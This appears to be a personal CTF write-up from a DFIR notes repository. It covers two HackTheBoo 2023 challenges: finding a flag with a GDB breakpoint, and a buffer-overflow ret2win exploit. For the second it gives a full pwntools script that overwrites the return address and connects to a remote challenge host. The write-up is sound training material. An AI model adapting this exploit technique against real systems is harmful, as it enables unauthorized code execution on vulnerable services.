These are thier own seperate categories. But there is overlap in DFIR and knowing how to do these can develop skills which will help in DFIR. 


# Break points

HTB hacktheboo2023 CTF had a rev challenge `ghost in the box`. It was a very easy challenge with essentially the only thing needed to do was set a breakpoint.

First running the program we see we get a currpt output.

![image](https://github.com/dbissell6/DFIR/assets/50979196/172cf7e6-a7b8-40fb-ba21-9e48544d025f)


Disassemble main notice +143 get flag and +155 ghost

![image](https://github.com/dbissell6/DFIR/assets/50979196/a1bfcbea-cc61-4264-b4ce-eaea65fec747)

First intuition is the ghost function is overwriting and scrambing the getflag. to check this we can set a breakpoint inbetween the getflag and ghost functions


![image](https://github.com/dbissell6/DFIR/assets/50979196/33413e74-9b2c-435d-b1e5-a47d542b3247)

can see the flag intact in the registers. 

![image](https://github.com/dbissell6/DFIR/assets/50979196/eea8c14b-d4d8-491e-8c68-ce6b24d86d0c)


# Buffer overflow + pwntools

HTB hacktheboo2023 pwn challenge called lemonade stand. Notice a buffer overflow allowing to take control of rip and a function called grapes that will drop the flag. Execute with pwntools.


![image](https://github.com/dbissell6/DFIR/assets/50979196/7504632e-f5ae-4495-b2d8-a36d00d180d7)


Grapes

![image](https://github.com/dbissell6/DFIR/assets/50979196/7229d0a6-1b8e-4a82-89e8-2375542bff07)


Complete pwntools script
```

from pwn import *
import warnings
import os

# Set up pwntools for the correct architecture
context.arch = 'amd64'
context.log_level = 'critical'

# This will allow pwntools to access locally to find location of function
fname = './lemonade_stand_v1'
e = ELF(fname)

# Address of the 'grapes_mem' function
# Notice retn will == p64(e.sym.grapes)
grapes_mem = '0x00000000004008cf'
print(grapes_mem, p64(e.sym.grapes))


# Connect to the server
target_host = '94.237.59.206'  # replace with the target IP address
target_port = 38999       # replace with the target port number
r = remote(target_host, target_port)

# Payload crafting
offset = 94
padding = b'A' * offset
rbp = b'B' * 8
retn = '\xcf\x08\x40\x00\x00\x00\x00\x00'

# Interacting with the program
r.recvuntil(b'>> ')
r.sendline(b'2')
r.recvuntil(b'>> ')
r.sendline(b'2')
r.recvuntil(b'>> ')
r.sendline(b'1')
r.recvuntil(b'>> ')
r.sendline(b'1')


# Finalizing the payload
# p1 uses ret and the manual, p2 uses 
payload = flat([padding, rbp, retn])
payload2 = flat([padding, rbp, p64(e.sym.grapes)])

# Sending the payload
# Uncomment whichever choice

#r.sendline(payload)
r.sendline(payload2)

# Keep the connection alive to see any potential outputs or to interact further
r.interactive()



```

Running Final pwntools output

![image](https://github.com/dbissell6/DFIR/assets/50979196/52eb2bf7-8fc4-46c7-b30b-37c89862fd0d)
